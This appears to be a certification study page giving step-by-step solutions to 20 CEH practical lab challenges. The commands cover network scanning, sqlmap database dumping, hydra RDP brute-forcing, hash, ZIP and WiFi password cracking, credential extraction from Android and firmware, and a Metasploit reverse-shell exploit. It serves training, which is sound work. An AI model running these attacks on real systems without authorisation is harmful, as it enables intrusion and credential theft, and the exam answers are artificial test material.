---
layout: default
title: All Challenges (1-20)
parent: Challenges
nav_order: 1
description: "All 20 CEH v13 practical challenges in sequence with full step-by-step solutions."
---

# All 20 Challenges — Full Solutions

Challenges in exam sequence (1 → 20). Use <kbd>Ctrl</kbd>+<kbd>F</kbd> to jump to a challenge or tool.

[← Challenge index](./){: .btn .btn-outline }

---

#### Challenge 1: Find Domain Controller DNS Name {#challenge-1}
**Domain:** 1 — Network Scanning | **Difficulty:** Easy | **Time:** 10-15 min
**Question:** Conduct a comprehensive scan of the network to identify the DNS computer name of the Domain Controller.
**Answer Format:** AaaaaAaaa*AAAAAA*aaa (e.g., DOMAINCONTROLLER01)

**Solution:**
1. `nmap -A -T4 192.168.1.0/24`
2. Look for domain controller (ports 389/445/3389)
3. `nmap --script smb-os-discovery.nse -p445 [DC_IP]`
4. Extract the Computer name field

---

#### Challenge 2: Find IMAP Mercury Service Version {#challenge-2}
**Domain:** 1 — Network Scanning | **Difficulty:** Easy | **Time:** 10 min
**Question:** Identify the version of the IMAP Mercury service.
**Answer Format:** N.NN (e.g., 4.62)

**Solution:**
1. `nmap -A -T4 -p- 192.168.1.0/24`
2. Find port 143 (IMAP)
3. `nmap -sV -p 143 [HOST]`
4. Extract the version number

---

#### Challenge 3: SQL Injection — Extract Database {#challenge-3}
**Domain:** 3 — Web Hacking | **Difficulty:** Medium | **Time:** 15-20 min
**Question:** Use SQL injection to extract data from the victim database.
**Answer Format:** NaaAaa*aaa*aaaaa

**Solution:**
1. `sqlmap -u "http://192.168.1.5/page.php?id=1" -v`
2. `sqlmap -u "http://192.168.1.5/page.php?id=1" --dbs`
3. `sqlmap -u "http://192.168.1.5/page.php?id=1" -D dbname --tables`
4. `sqlmap -u "http://192.168.1.5/page.php?id=1" -D dbname -T users --dump`
5. Extract the answer from output

---

#### Challenge 4: Android Steganography {#challenge-4}
**Domain:** 5 — Mobile & IoT | **Difficulty:** Medium | **Time:** 15-20 min
**Question:** Extract the hidden data from IMG_20240621_143000.jpg on an Android device.
**Answer Format:** Variable (depends on hidden content)

**Solution:**
1. `adb connect 192.168.1.100:5555`
2. `adb shell ls /sdcard/DCIM/Camera/`
3. `adb pull /sdcard/DCIM/Camera/IMG_20240621_143000.jpg ./`
4. `steghide extract -sf IMG_20240621_143000.jpg -p ""`
5. `cat secret.txt`

---

#### Challenge 5: Crack RDP Credentials {#challenge-5}
**Domain:** 2 — System Hacking | **Difficulty:** Medium | **Time:** 15-20 min
**Question:** Crack the Windows RDP password for user "Admin".
**Answer Format:** AaaAaa*aaaa

**Solution:**
1. `nmap -p 3389 192.168.1.0/24` (find RDP)
2. `hydra -l Admin -P rockyou.txt rdp://[HOST]:3389 -v`
3. Wait for the successful login message
4. Extract the password

---

#### Challenge 6: Find Encrypted Password in Registry {#challenge-6}
**Domain:** 2 — System Hacking | **Difficulty:** Medium | **Time:** 15 min
**Question:** Connect via RDP with cracked credentials, find the password stored in the registry.
**Answer Format:** AaaaaaAaa*AAA

**Solution:**
1. `xfreerdp /u:Admin /p:PASSWORD /v:192.168.1.50`
2. Open Command Prompt
3. `reg query HKLM\Software\Microsoft\Windows /s | findstr /i password`
4. Extract the found password

---

#### Challenge 7: Advanced ADB Workflows {#challenge-7}
**Domain:** 5 — Mobile & IoT | **Difficulty:** Medium | **Time:** 20 min
**Question:** Find the database with login credentials on an Android device.
**Answer Format:** Variable (credentials from database)

**Solution:**
1. `adb root`
2. `adb shell ls /data/data/ | grep -i app_name`
3. `adb pull /data/data/com.example.banking/databases/users.db ./`
4. `sqlite3 users.db`
5. `.tables`
6. `SELECT * FROM users;`

---

#### Challenge 8: Hash Cracking {#challenge-8}
**Domain:** 4 — Cryptography | **Difficulty:** Easy | **Time:** 10 min
**Question:** Crack the MD5 hash to find the password.
**Answer Format:** AaaAaa*Aaaa

**Solution:**
1. `hashid hash_value`
2. `hashcat -m 0 -a 0 hashfile rockyou.txt`
3. Wait for the match
4. Extract the password

---

#### Challenge 9: PE File Version Extraction {#challenge-9}
**Domain:** 4 — Cryptography | **Difficulty:** Medium | **Time:** 15 min
**Question:** Find the File Version number from Ghostware.exe.
**Answer Format:** N.N.N.N (e.g., 2.3.4.5)

**Solution:**
1. Launch DIE (Detect It Easy)
2. File → Open → Ghostware.exe
3. Click "File Info" in the right pane
4. Look for the "Version" / "FileVersion" field
5. Extract the version number

---

#### Challenge 10: RAT Detection in PCAP {#challenge-10}
**Domain:** 6 — Traffic Analysis | **Difficulty:** Hard | **Time:** 20-25 min
**Question:** Analyze traffic to identify RAT activity and extract attacker details.
**Answer Format:** Variable (IP, port, commands)

**Solution:**
1. Open the PCAP in Wireshark
2. Look for unusual outbound connections
3. Filter: `ip.src == 192.168.1.50 && tcp.dstport != 80,443,53`
4. Right-click → Follow TCP Stream
5. Identify attacker IP, port, and commands

---

#### Challenge 11: Steganography Extraction {#challenge-11}
**Domain:** 4 — Cryptography | **Difficulty:** Medium | **Time:** 10-15 min
**Question:** Extract hidden data from an image file.
**Answer Format:** AaaAaa*Aaaa

**Solution:**
1. `steghide info image.jpg`
2. `steghide extract -sf image.jpg -p ""`
3. `cat secret.txt`

---

#### Challenge 12: DDoS Attack — Identify Attacker {#challenge-12}
**Domain:** 6 — Traffic Analysis | **Difficulty:** Medium | **Time:** 15 min
**Question:** Analyze traffic targeting 172.22.10.10, identify the Windows attacker IP and OS.
**Answer Format:** NN.NN.NN.NN

**Solution:**
1. Open the PCAP in Wireshark
2. Filter: `ip.dst == 172.22.10.10`
3. Statistics → Endpoints
4. Find the IP with the highest packet count
5. Check TTL values (128 = Windows)
6. Extract the attacker IP

---

#### Challenge 13: Metasploit Exploitation — Gain Shell {#challenge-13}
**Domain:** 2 — System Hacking | **Difficulty:** Hard | **Time:** 25-30 min
**Question:** Exploit the vulnerable service on the target host and retrieve the flag from the compromised user's Desktop.
**Answer Format:** Variable (flag string, e.g., FLAG{...})

**Solution:**
1. Identify the service: `nmap -sV -p- [TARGET]`
2. Launch Metasploit: `msfconsole -q`
3. Search the matching module: `search [service name]`
4. `use exploit/[matched/module/path]`
5. `set RHOSTS [TARGET]` and `set LHOST [YOUR_IP]`
6. (If needed) `set PAYLOAD windows/meterpreter/reverse_tcp`
7. `exploit`
8. In the session: `shell` → `type C:\Users\<user>\Desktop\flag.txt` (or `cat` on Linux targets)

---

#### Challenge 14: WordPress Enumeration with WPScan {#challenge-14}
**Domain:** 3 — Web Hacking | **Difficulty:** Medium | **Time:** 15-20 min
**Question:** Enumerate the target WordPress site and identify the version of the vulnerable plugin.
**Answer Format:** N.N.N (e.g., 1.5.2)

**Solution:**
1. Confirm WordPress: `whatweb http://192.168.1.50`
2. Enumerate plugins + users: `wpscan --url http://192.168.1.50 --enumerate vp,u`
3. (With API token for CVE data) `wpscan --url http://192.168.1.50 --enumerate vp --api-token [TOKEN]`
4. Locate the flagged plugin and read its **Version** line
5. Extract the version number

---

#### Challenge 15: Crack a Password-Protected Archive {#challenge-15}
**Domain:** 4 — Cryptography | **Difficulty:** Medium | **Time:** 15 min
**Question:** Crack the password-protected ZIP archive and read the secret file inside.
**Answer Format:** Variable (contents of the secret file)

**Solution:**
1. Extract the hash: `zip2john secret.zip > zip.hash`
2. Crack it: `john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash`
3. Show the password: `john --show zip.hash`
4. Unzip with it: `unzip -P [password] secret.zip`
5. `cat secret.txt` to read the answer

---

#### Challenge 16: Path Traversal / Directory Enumeration {#challenge-16}
**Domain:** 3 — Web Hacking | **Difficulty:** Medium | **Time:** 15 min
**Question:** Find the hidden admin directory on the web server.
**Answer Format:** /admin*area

**Solution:**
1. `nikto -h http://192.168.1.50`
2. Or: `gobuster dir -u http://192.168.1.50 -w /usr/share/wordlists/dirb/common.txt`
3. Look for 200/301 responses (found directories)
4. Test found directories in a browser
5. Identify the admin-related directory

---

#### Challenge 17: IoT Firmware Analysis {#challenge-17}
**Domain:** 5 — Mobile & IoT | **Difficulty:** Hard | **Time:** 20-25 min
**Question:** Extract the IoT device firmware image and find the hardcoded admin credentials.
**Answer Format:** Variable (user:password)

**Solution:**
1. Inspect the image: `binwalk firmware.bin`
2. Extract the filesystem: `binwalk -e firmware.bin`
3. Search for credentials in the extracted root:
   - `grep -riE "password|passwd|admin" _firmware.bin.extracted/`
   - `strings firmware.bin | grep -iE "admin|root|pass"`
4. Inspect `/etc/passwd` and `/etc/shadow` in the extracted filesystem
5. Extract the hardcoded user:password pair

---

#### Challenge 18: IoT Protocol — MQTT Topic Extraction {#challenge-18}
**Domain:** 6 — Traffic Analysis | **Difficulty:** Medium | **Time:** 15 min
**Question:** Find the IoT Publish message in traffic and extract the topic name.
**Answer Format:** Aaaa*Aaaa (e.g., home/temperature)

**Solution:**
1. Open the PCAP in Wireshark
2. Filter: `mqtt.msgtype == 3`
3. Look for PUBLISH packets
4. Expand the MQTT section in packet details
5. Find the "Topic Name" field and extract it

---

#### Challenge 19: Advanced Traffic Analysis — Data Exfiltration {#challenge-19}
**Domain:** 6 — Traffic Analysis | **Difficulty:** Hard | **Time:** 20-25 min
**Question:** Identify data exfiltration in the traffic — extract the stolen files/credentials.
**Answer Format:** Variable

**Solution:**
1. Open the PCAP in Wireshark
2. Look for large outbound transfers
3. Filter: `ip.src == [internal_ip] && ip.dst != [internal_network]`
4. Identify the protocol (FTP, SMB, HTTP)
5. Follow TCP Stream for the complete data
6. Extract file contents or credentials

---

#### Challenge 20: WiFi Cracking — Extract Last 4 Characters {#challenge-20}
**Domain:** 7 — Wireless | **Difficulty:** Easy | **Time:** 10-15 min
**Question:** Crack the WiFi password from Credmapwifi.cap and provide the last 4 characters.
**Answer Format:** aaaN (e.g., pass1)

**Solution:**
1. `aircrack-ng Credmapwifi.cap`
2. Find the BSSID: `AA:BB:CC:DD:EE:FF`
3. `aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF Credmapwifi.cap`
4. Read: `KEY FOUND! [ PasswordHere ]`
5. Extract the last 4 characters

---

[← Back to challenge index](./){: .btn }
